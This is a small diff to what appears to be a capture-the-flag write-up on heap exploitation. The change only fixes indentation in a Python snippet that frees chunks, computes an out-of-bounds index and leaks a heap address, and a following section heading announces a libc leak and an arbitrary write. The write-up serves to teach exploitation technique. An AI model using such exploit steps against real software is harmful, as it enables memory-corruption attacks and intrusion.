@@ -42,18 +42,18 @@ And by using the given features we can get the contents of x and y in the nodes.
 for i in range(5):
 		add(i,i)
 
-	delete(0)
-	delete(1)
-	delete(2)
-	delete(3)
-	delete(4)
+delete(0)
+delete(1)
+delete(2)
+delete(3)
+delete(4)
 
-	idx = (0x7fc6681fc370 - 0x7fc6681fb260)//8
+idx = (0x7fc6681fc370 - 0x7fc6681fb260)//8
 
-	select(idx)
-	HEAP = getnth(0)
+select(idx)
+HEAP = getnth(0)
 
-	log.info("HEAP: 0x%x"%HEAP) # 0x7f68373c72d0
+log.info("HEAP: 0x%x"%HEAP) # 0x7f68373c72d0
 ```
 
 # LIBC Leak and arbitrary write
